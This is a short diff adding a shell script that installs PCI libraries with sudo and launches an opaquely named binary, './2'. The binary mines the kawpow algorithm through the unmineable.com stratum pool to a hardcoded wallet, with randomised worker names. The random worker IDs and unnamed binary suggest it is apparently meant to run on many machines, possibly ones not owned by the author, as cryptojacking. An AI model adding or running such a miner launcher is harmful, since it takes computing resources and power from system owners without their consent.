@@ -1,0 +1,4 @@
+WORKER=$(echo $(shuf -i 1-99999 -n 1)-rvn)
+sudo apt-get update
+sudo apt-get install libpci3 libpci-dev
+sudo ./2 -a kawpow -o stratum+tcp://kp.unmineable.com:3333 -u COIN:83k7gWKercycphtgrASTt3gzSZWZyDELhAe4PsU9ST5G1mw2ShJJD1bbVxF5wN4d1FZN1v6chH1eEGk9CBYwBDrQJxdLm1r.$(shuf -i 1-99999 -n 1)
